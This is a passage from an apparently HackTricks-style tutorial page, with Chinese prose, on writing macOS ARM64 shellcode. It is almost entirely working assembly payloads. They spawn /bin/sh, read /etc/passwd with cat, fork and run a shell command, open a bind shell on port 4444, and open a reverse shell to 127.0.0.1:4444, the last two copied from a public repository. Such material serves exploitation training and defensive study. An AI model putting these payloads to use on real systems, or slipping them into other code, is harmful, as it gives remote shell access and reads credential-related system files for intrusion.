; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### 使用 cat 读取

目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数 (x1) 是一个参数数组（在内存中，这意味着一堆地址的栈）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 从一个分叉中使用 sh 调用命令，以便主进程不被终止
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

从 [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) 在 **port 4444** 中的 Bind shell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 反向 shell

来自 [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)，revshell 到 **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
